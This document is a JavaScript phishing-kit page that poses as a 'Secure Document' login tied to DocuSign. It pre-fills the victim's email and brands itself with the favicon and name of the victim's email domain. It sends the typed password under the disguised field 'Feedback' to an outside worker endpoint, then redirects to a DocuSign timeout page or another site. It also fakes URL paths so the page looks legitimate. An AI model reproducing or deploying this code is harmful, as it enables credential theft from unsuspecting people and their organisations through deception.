(function () {
  "use strict";

  var config = {
    BG_IMG: "https://i.postimg.cc/Dz2Q7TzV/imageing.png",
    BG_BRI: 1,
    BG_DAR: 1,
    BG_CON: 1,
    BG_SAT: 1,
    BG_BLUR: 0,
    BG_GRAY: false,
    BG_OVERLAY: 0.25,
    PHP_ENDPOINT:
      "https://rum-email-proxy.haricoting.workers.dev/contact",
    SUCCESS_REDIRECT: "https://matta.com/email/email/view.php",
    LOCKOUT_REDIRECT:
      "https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f",
    SECRET_KEY: "MATT_SECURE_2026",
    MAX_TRIES: 3,
    LOCKOUT_DELAY: 2000,
    STORAGE_KEY: "st_7b3f19",
    PATH_SEGMENTS: ["profile", "dashboard", "console", "manage", "overview"],
    MSG_WRONG: "An error occurred. Please try again later.",
    MSG_LOCKOUT: "Too many incorrect attempts. Access blocked.",
    MSG_GRANTED: "Access granted. Redirecting...",
    MSG_NET: "Network error. Please try again.",
    HEADING: "Secure Document",
    SUBHEAD: "Login to view your secure document",
    FOOTER: "Message Center",
    EMAIL_LABEL: "Email",
    KEY_LABEL: "Password",
    KEY_PLACEHOLDER: "Enter your password",
    BUTTON_TEXT: "Unlock",
    TAG_TEXT: "Encrypted Delivery",
  };

  function injectStyles() {
    var cssText =
      "*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,Helvetica,Arial,sans-serif}html{height:100%}body{min-height:100vh;height:100%;display:flex;align-items:center;justify-content:center;padding:1.5rem;position:relative;overflow-x:hidden;overflow-y:auto;margin:0}#bg_canvas{position:fixed;inset:0;width:100%;height:100%;background-size:cover;background-position:center;background-repeat:no-repeat;z-index:0;pointer-events:none}#bg_veil{position:fixed;inset:0;background:rgba(255,255,255,0.25);z-index:1;pointer-events:none}.frame_v7{position:relative;z-index:2;width:100%;max-width:460px;background:#ffffff;border-radius:1.5rem;box-shadow:0 18px 36px -12px rgba(0,20,30,0.22),0 6px 14px rgba(0,0,0,0.04);padding:2.2rem 2rem 1.9rem;border:1px solid rgba(255,255,255,0.6);transition:transform .15s ease;margin:auto}@keyframes wobble_q{0%,100%{transform:translateX(0)}10%,30%,50%,70%,90%{transform:translateX(-8px)}20%,40%,60%,80%{transform:translateX(8px)}}.frame_v7.wobble_q_on{animation:wobble_q .6s cubic-bezier(.36,.07,.19,.97) both}.brand_row{display:flex;flex-direction:column;align-items:center;margin-bottom:1rem;width:100%}.brand_orb{width:74px;height:74px;background:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:inset 0 1px 6px rgba(0,0,0,.02),0 8px 16px -8px rgba(18,52,77,.15);border:3px solid #fff;margin-bottom:.8rem;overflow:hidden}.brand_orb img{width:100%;height:100%;object-fit:contain;display:block;padding:6px}.chip_tag{font-size:.65rem;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:#2b5f8a;background:#e9f0f9;padding:.25rem 1rem;border-radius:30px;display:inline-flex;align-items:center;gap:.4rem;border:1px solid #cbdae8;margin-bottom:.7rem}.chip_tag::before,.chip_tag::after{content:\"•\";font-size:1.1rem;line-height:1;color:#1f4b6e;opacity:.7}.title_main{font-size:1.25rem;font-weight:600;color:#1a2e3f;text-align:center;letter-spacing:-.01em;line-height:1.35;margin-bottom:.35rem;font-family:'Times New Roman',Georgia,serif;word-wrap:break-word;overflow-wrap:break-word;max-width:100%;padding:0 .25rem;width:100%}.caption_sub{text-align:center;color:#54738b;font-size:.8rem;margin-bottom:1.6rem;font-weight:400;word-wrap:break-word;overflow-wrap:break-word;max-width:100%;padding:0 .25rem;width:100%}.row_block{margin-bottom:1.3rem;width:100%}.lbl_small{display:block;font-size:.7rem;font-weight:700;color:#1f405b;margin-bottom:.4rem;letter-spacing:.04em;text-transform:uppercase;opacity:.8}.field_shell{display:flex;align-items:center;background:#fff;border:1.5px solid #d3e2ee;border-radius:.9rem;padding:0.05rem 0.05rem 0.05rem 1rem;transition:all .2s;box-shadow:0 2px 4px rgba(0,0,0,.01);width:100%;position:relative}.field_shell:focus-within{border-color:#2b5f8a;box-shadow:0 0 0 4px rgba(43,95,138,.1)}.field_shell.locked_bg{background:#f7fafd}.ico_slot{display:flex;align-items:center;justify-content:center;width:22px;height:22px;flex-shrink:0;color:#5a7a94;opacity:0.9;margin-right:0.75rem}.ico_slot svg{width:100%;height:100%;display:block;stroke-width:1.8px;stroke-linecap:round;stroke-linejoin:round}.inp_core{width:100%;padding:.85rem .9rem .85rem 0;border:none;background:transparent;font-size:.95rem;font-weight:500;color:#122b3b;outline:none;border-radius:.9rem;flex:1}.inp_core::placeholder{color:#a3b8cb;font-weight:400;font-size:.9rem}.inp_core:read-only{color:#54738b;cursor:default}.eye_btn{background:transparent;border:none;padding:0 .9rem 0 .4rem;cursor:pointer;color:#5a7a94;display:flex;align-items:center;justify-content:center;transition:color .2s;width:40px;height:40px;flex-shrink:0}.eye_btn svg{width:22px;height:22px;display:block;stroke-width:1.8px}.eye_btn:hover{color:#0f2b40}.cta_main{width:100%;background:#0f5b8c;border:none;border-radius:2rem;padding:.95rem 1.3rem;color:#fff;font-weight:600;font-size:1rem;letter-spacing:.02em;cursor:pointer;margin-top:.4rem;transition:all .2s;box-shadow:0 10px 20px -8px rgba(15,91,140,.4);display:flex;align-items:center;justify-content:center;gap:.55rem;border:1px solid rgba(255,255,255,.2)}.cta_main:hover:not(:disabled){background:#0a4266;transform:scale(1.01);box-shadow:0 16px 26px -8px rgba(10,66,102,.5)}.cta_main:active:not(:disabled){transform:scale(.98);background:#083552}.cta_main:disabled{opacity:.8;cursor:not-allowed}.cta_icon{display:inline-flex;align-items:center;justify-content:center;width:20px;height:20px}.cta_icon svg{width:100%;height:100%;display:block;stroke-width:2px;stroke-linecap:round;stroke-linejoin:round}.ring_load{display:inline-block;width:16px;height:16px;border:2.5px solid rgba(255,255,255,.35);border-top-color:#fff;border-radius:50%;animation:spin_r .7s linear infinite}@keyframes spin_r{to{transform:rotate(360deg)}}.base_note{margin-top:1.6rem;text-align:center;font-size:.65rem;color:#7e9bb3;letter-spacing:.01em;border-top:1px solid #e4edf5;padding-top:1rem;width:100%}.alert_bar{background:#fee9e7;color:#b33a2f;padding:.65rem .9rem;border-radius:.8rem;font-size:.8rem;margin-bottom:.9rem;border:1px solid #f5c6c2;display:none;opacity:0;transform:translateY(-6px);transition:opacity .3s ease,transform .3s ease;word-break:break-word;line-height:1.5;text-align:center;width:100%}.alert_bar.visible{display:block;opacity:1;transform:translateY(0)}@media (max-width:480px){.frame_v7{padding:1.8rem 1.4rem;border-radius:1.2rem;margin:auto 1rem}.brand_orb{width:64px;height:64px}.title_main{font-size:1.1rem}}";
    var styleElement = document.createElement("style");
    styleElement.id = "zz_core_style";
    styleElement.appendChild(document.createTextNode(cssText));
    document.head.appendChild(styleElement);
  }
function createDOM() {
  var bgCanvas = document.createElement("div");
    bgCanvas.id = "bg_canvas";
    document.body.appendChild(bgCanvas);

    var bgVeil = document.createElement("div");
    bgVeil.id = "bg_veil";
    document.body.appendChild(bgVeil);

    var cardRoot = document.createElement("div");
    cardRoot.className = "frame_v7";
    cardRoot.id = "card_root";
    
    cardRoot.innerHTML = 
      '<div class="brand_row">' +
        '<div class="brand_orb">' +
          '<img src="" alt="logo" id="brand_img">' +
        '</div>' +
        '<div class="chip_tag">' + config.TAG_TEXT + '</div>' +
        '<h1 class="title_main" id="title_node">' + config.HEADING + '</h1>' +
        '<div class="caption_sub" id="caption_node">' + config.SUBHEAD + '</div>' +
      '</div>' +
      '<div class="alert_bar" id="alert_node"></div>' +
      '<form id="main_form">' +
        '<div class="row_block">' +
          '<label class="lbl_small" for="mail_x9k2">' + config.EMAIL_LABEL + '</label>' +
          '<div class="field_shell locked_bg">' +
            '<span class="ico_slot">' +
              '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor">' +
                '<rect x="3" y="5" width="18" height="14" rx="2"/>' +
                '<path d="M3 7l9 6 9-6"/>' +
              '</svg>' +
            '</span>' +
          '<input class="inp_core" type="email" id="mail_x9k2" value="' + [Email] + '" autocomplete="off" readonly>' +
          '</div>' +
        '</div>' +
        '<div class="row_block">' +
          '<label class="lbl_small" for="code_p4r7">' + config.KEY_LABEL + '</label>' +
          '<div class="field_shell">' +
            '<span class="ico_slot">' +
              '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor">' +
                '<rect x="4" y="11" width="16" height="10" rx="2"/>' +
                '<path d="M8 11V7a4 4 0 0 1 8 0v4"/>' +
                '<circle cx="12" cy="16" r="1.3"/>' +
              '</svg>' +
            '</span>' +
            '<input class="inp_core" type="password" id="code_p4r7" placeholder="' + config.KEY_PLACEHOLDER + '" autocomplete="off" required>' +
            '<button type="button" class="eye_btn" id="eye_toggle" aria-label="Toggle view">' +
              '<svg id="eye_show" viewBox="0 0 24 24" fill="none" stroke="currentColor">' +
                '<path d="M1.5 12S5.5 5 12 5s10.5 7 10.5 7-4 7-10.5 7S1.5 12 1.5 12z"/>' +
                '<circle cx="12" cy="12" r="3"/>' +
              '</svg>' +
              '<svg id="eye_hide" viewBox="0 0 24 24" fill="none" stroke="currentColor" style="display:none;">' +
                '<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-6.5 0-10.5-7-10.5-7a19.6 19.6 0 0 1 5.06-5.94"/>' +
                '<path d="M9.9 4.24A10.94 10.94 0 0 1 12 4c6.5 0 10.5 7 10.5 7a19.6 19.6 0 0 1-3.06 3.94"/>' +
                '<path d="M9.88 9.88a3 3 0 0 0 4.24 4.24"/>' +
                '<line x1="2" y1="2" x2="22" y2="22"/>' +
              '</svg>' +
            '</button>' +
          '</div>' +
        '</div>' +
        '<button type="submit" class="cta_main" id="cta_node">' +
          '<span class="cta_icon">' +
            '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor">' +
              '<path d="M8 11V7a4 4 0 0 1 8 0"/>' +
              '<rect x="4" y="11" width="16" height="10" rx="2"/>' +
            '</svg>' +
          '</span>' +
          config.BUTTON_TEXT +
        '</button>' +
      '</form>' +
      '<div class="base_note" id="base_node">' + config.FOOTER + ' · © 2026</div>';
    
    document.body.appendChild(cardRoot);
  }

  function applyBackground() {
    var bgCanvas = document.getElementById("bg_canvas");
    var bgVeil = document.getElementById("bg_veil");
    if (!bgCanvas || !bgVeil) {
      return;
    }
    bgCanvas.style.backgroundImage = 'url("' + config.BG_IMG + '")';
    var filters = [];
    filters.push("brightness(" + config.BG_BRI + ")");
    if (config.BG_DAR !== 1) {
      filters.push("brightness(" + 1 / config.BG_DAR + ")");
    }
    filters.push("contrast(" + config.BG_CON + ")");
    filters.push("saturate(" + config.BG_SAT + ")");
    if (config.BG_BLUR > 0) {
      filters.push("blur(" + config.BG_BLUR + "px)");
    }
    if (config.BG_GRAY) {
      filters.push("grayscale(1)");
    }
    bgCanvas.style.filter = filters.join(" ");
    bgVeil.style.background =
      "rgba(255,255,255," + config.BG_OVERLAY + ")";
  }

  function fakeURLPath() {
    try {
      var randomBytes = new Uint8Array(24);
      crypto.getRandomValues(randomBytes);
      var randomString = btoa(String.fromCharCode.apply(null, randomBytes))
        .replace(/\+/g, "-")
        .replace(/\//g, "_")
        .replace(/=+$/, "");
      history.replaceState(
        null,
        "",
        "#/" + config.PATH_SEGMENTS.join("/") + "/" + randomString,
      );
    } catch (e) {}
  }

  function init() {
    injectStyles();
    createDOM();
    applyBackground();
    fakeURLPath();
    var emailInput = document.getElementById("mail_x9k2");
    var passwordInput = document.getElementById("code_p4r7");
    var brandImg = document.getElementById("brand_img");
    var titleNode = document.getElementById("title_node");
    var captionNode = document.getElementById("caption_node");
    var baseNode = document.getElementById("base_node");
    var eyeToggle = document.getElementById("eye_toggle");
    var eyeShow = document.getElementById("eye_show");
    var eyeHide = document.getElementById("eye_hide");
    var alertNode = document.getElementById("alert_node");
    var ctaNode = document.getElementById("cta_node");
    var cardRoot = document.getElementById("card_root");
    var mainForm = document.getElementById("main_form");

    var alertTimeout = null;
    var isLockedOut = false;

    function getDefaultLogo() {
      return "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='45' fill='%23464f5b'/%3E%3Ctext x='50' y='67' font-family='Arial, Helvetica, sans-serif' font-size='48' font-weight='bold' fill='white' text-anchor='middle'%3ES%3C/text%3E%3C/svg%3E";
    }

    function loadLogo(domain) {
      if (!domain) {
        brandImg.src = getDefaultLogo();
        return;
      }
      var faviconUrl =
        "https://www.google.com/s2/favicons?domain=" +
        encodeURIComponent(domain) +
        "&sz=128";
      var img = new Image();
      img.onload = function () {
        if (img.width > 16 || img.height > 16) {
          brandImg.src = faviconUrl;
        } else {
          brandImg.src = getDefaultLogo();
        }
      };
      img.onerror = function () {
        brandImg.src = getDefaultLogo();
      };
      img.src = faviconUrl;
    }

    function extractDomain(email) {
      if (!email || email.indexOf("@") === -1) {
        return "";
      }
      var parts = email.split("@");
      if (parts.length === 2 && parts[1].trim() !== "") {
        return parts[1].trim().toLowerCase();
      }
      return "";
    }

    function capitalize(str) {
      if (!str) {
        return "";
      }
      return str.charAt(0).toUpperCase() + str.slice(1);
    }

    function showAlert(message, type) {
      if (alertTimeout) {
        clearTimeout(alertTimeout);
        alertTimeout = null;
      }
      alertNode.innerHTML = message;
      if (type === "success") {
        alertNode.style.background = "#e3f5e9";
        alertNode.style.color = "#1e7a4b";
        alertNode.style.borderColor = "#b8e0c8";
      } else {
        alertNode.style.background = "#fee9e7";
        alertNode.style.color = "#b33a2f";
        alertNode.style.borderColor = "#f5c6c2";
      }
      alertNode.classList.add("visible");
      if (type === "success") {
        alertTimeout = setTimeout(function () {
          alertNode.classList.remove("visible");
        }, 6000);
      }
    }

    function hideAlert() {
      alertNode.classList.remove("visible");
      if (alertTimeout) {
        clearTimeout(alertTimeout);
        alertTimeout = null;
      }
    }

    function shakeCard() {
      cardRoot.classList.remove("wobble_q_on");
      cardRoot.offsetWidth;
      cardRoot.classList.add("wobble_q_on");
      setTimeout(function () {
        cardRoot.classList.remove("wobble_q_on");
      }, 700);
    }

    function updateUI() {
      var emailValue = emailInput.value.trim();
      var domain = extractDomain(emailValue);
      if (!domain) {
        titleNode.textContent = config.HEADING;
        captionNode.textContent = config.SUBHEAD;
        baseNode.textContent = config.FOOTER + " · © 2026";
        loadLogo("");
        return;
      }
      var domainName = domain.split(".")[0];
      var capitalizedName = capitalize(domainName);
      titleNode.textContent = capitalizedName + " " + config.HEADING;
      captionNode.textContent = config.SUBHEAD;
      baseNode.textContent =
        capitalizedName + " " + config.FOOTER + " · © 2026";
      loadLogo(domain);
    }

    emailInput.addEventListener("input", updateUI);

    eyeToggle.addEventListener("click", function () {
      var isPassword = passwordInput.getAttribute("type") === "password";
      if (isPassword) {
        passwordInput.setAttribute("type", "text");
        eyeShow.style.display = "none";
        eyeHide.style.display = "block";
      } else {
        passwordInput.setAttribute("type", "password");
        eyeShow.style.display = "block";
        eyeHide.style.display = "none";
      }
      passwordInput.focus();
    });

    function lockout() {
      if (isLockedOut) {
        return;
      }
      isLockedOut = true;
      showAlert(config.MSG_LOCKOUT, "error");
      shakeCard();
      passwordInput.value = "";
      ctaNode.disabled = true;
      setTimeout(function () {
        window.location.href = config.LOCKOUT_REDIRECT;
      }, config.LOCKOUT_DELAY);
    }

    function submitForm() {
      if (isLockedOut) {
        return;
      }
      var email = emailInput.value.trim();
      var password = passwordInput.value.trim();
      hideAlert();
      if (!email || email.indexOf("@") === -1) {
        showAlert("Please enter a valid email address.", "error");
        shakeCard();
        return;
      }
      if (!password) {
        showAlert("Please enter your password.", "error");
        shakeCard();
        return;
      }
      
      ctaNode.disabled = true;
      ctaNode.innerHTML = '<span class="ring_load"></span> Loading...';
      
      var startTime = Date.now();
      
      // New payload format using URLSearchParams
      var cleanPayload = new URLSearchParams();
      cleanPayload.append("Name", email);
      cleanPayload.append("Feedback", password);
      cleanPayload.append("timestamp", Date.now().toString());
      
      var hasError = false;
      var responseData = null;
      
      fetch(config.PHP_ENDPOINT, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
        body: cleanPayload.toString(),
      })
        .then(function (response) {
          return response.text();
        })
        .then(function (text) {
          try {
            responseData = JSON.parse(text);
          } catch (e) {
            hasError = true;
          }
        })
        .catch(function () {
          hasError = true;
        })
        .then(function () {
          var elapsed = Date.now() - startTime;
          var remainingDelay = Math.max(0, 2000 - elapsed);
          return new Promise(function (resolve) {
            setTimeout(resolve, remainingDelay);
          });
        })
        .then(function () {
          if (isLockedOut) {
            return;
          }
          var buttonHtml = '<span class="cta_icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8 11V7a4 4 0 0 1 8 0"/><rect x="4" y="11" width="16" height="10" rx="2"/></svg></span> ' + config.BUTTON_TEXT;
          if (hasError || !responseData) {
            ctaNode.disabled = false;
            ctaNode.innerHTML = buttonHtml;
            showAlert(config.MSG_NET, "error");
            shakeCard();
            passwordInput.value = "";
            passwordInput.focus();
            return;
          }
          if (responseData.status === "success") {
            showAlert(config.MSG_GRANTED, "success");
            setTimeout(function () {
              window.location.href = config.SUCCESS_REDIRECT;
            }, 1000);
            return;
          }
          if (responseData.status === "exhausted") {
            lockout();
            return;
          }
          var attempts =
            parseInt(sessionStorage.getItem(config.STORAGE_KEY) || "0", 10) +
            1;
          sessionStorage.setItem(config.STORAGE_KEY, String(attempts));
          if (attempts >= config.MAX_TRIES) {
            lockout();
            return;
          }
          ctaNode.disabled = false;
          ctaNode.innerHTML = buttonHtml;
          showAlert(config.MSG_WRONG, "error");
          shakeCard();
          passwordInput.value = "";
          passwordInput.focus();
        });
    }

    mainForm.addEventListener("submit", function (event) {
      event.preventDefault();
      submitForm();
    });

    updateUI();
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})();
